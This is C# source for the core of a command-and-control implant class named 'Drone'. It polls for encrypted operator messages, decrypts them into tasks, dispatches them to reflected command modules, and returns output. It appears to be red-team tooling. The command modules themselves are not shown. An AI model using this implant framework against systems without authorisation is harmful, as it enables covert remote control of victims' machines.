using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;

using Drone.Interfaces;
using Drone.Models;
using Drone.Services;
using Drone.Utilities;

namespace Drone;

public class Drone
{
    public IConfig Config { get; private set; }
    
    private Metadata _metadata;
    private ICrypto _crypto;
    private IHandler _handler;

    private readonly List<DroneFunction> _commands = new();
    
    private bool _running;
    
    public void Start()
    {
        Config = Helpers.GetDefaultConfig;
        _metadata = Helpers.GetMetadata;
        _crypto = new Crypto();
        
        LoadCommands();
        
        _handler = Helpers.GetHandler;
        _handler.Init(_metadata, Config, _crypto);
        
        // don't await
        _handler.Start().ConfigureAwait(false);
        
        _running = true;
        Run();
    }

    private void Run()
    {
        while (_running)
        {
            if (_handler.GetInbound(out var messages))
            {
                HandleC2Messages(messages);
            }
            
            Thread.Sleep(100);
        }
    }

    private void HandleC2Messages(IEnumerable<C2Message> messages)
    {
        foreach (var message in messages)
        {
            var thread = new Thread(HandleC2Message);
            thread.Start(message);
        }
    }

    private void HandleC2Message(object obj)
    {
        if (obj is not C2Message message)
            return;
        
        // decrypt message
        IEnumerable<DroneTask> tasks;
        
        try
        {
            tasks = _crypto.DecryptObject<IEnumerable<DroneTask>>(message.Iv, message.Data, message.Checksum);
        }
        catch (CryptoException e)
        {
            SendError("", e.Message);
            return;
        }

        HandleC2Tasks(tasks);
    }

    private void HandleC2Tasks(IEnumerable<DroneTask> tasks)
    {
        foreach (var task in tasks)
            HandlerC2Task(task);
    }

    private void HandlerC2Task(DroneTask task)
    {
        var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Function));
        
        if (command is null)
        {
            SendError(task.TaskId, $"Unknown command \"{task.Function}\"");
            return;
        }

        try
        {
            command.Execute(task);
        }
        catch (Exception e)
        {
            SendError(task.TaskId, e.Message);
        }
    }

    public void SendError(string id, string error)
    {
        var response = new DroneTaskOutput
        {
            TaskId = id,
            Status = DroneTaskOutput.TaskStatus.Aborted,
            Output = Encoding.UTF8.GetBytes(error)
        };
        
        SendTaskResponse(response);
    }

    public void SendOutput(string id, string output)
    {
        var response = new DroneTaskOutput
        {
            TaskId = id,
            Status = DroneTaskOutput.TaskStatus.Complete,
            Output = Encoding.UTF8.GetBytes(output)
        };
        
        SendTaskResponse(response);
    }

    public void SendTaskComplete(string id)
    {
        var response = new DroneTaskOutput
        {
            TaskId = id,
            Status = DroneTaskOutput.TaskStatus.Complete
        };
        
        SendTaskResponse(response);
    }

    public void SendTaskResponse(DroneTaskOutput output)
    {
        _handler.QueueOutbound(output);
    }

    public void Stop()
    {
        _running = false;
    }

    private void LoadCommands()
    {
        var self = Assembly.GetExecutingAssembly();

        foreach (var type in self.GetTypes())
        {
            if (!type.IsSubclassOf(typeof(DroneFunction)))
                continue;

            var command = (DroneFunction) Activator.CreateInstance(type);
            command.Init(this);
            
            _commands.Add(command);
        }
    }
}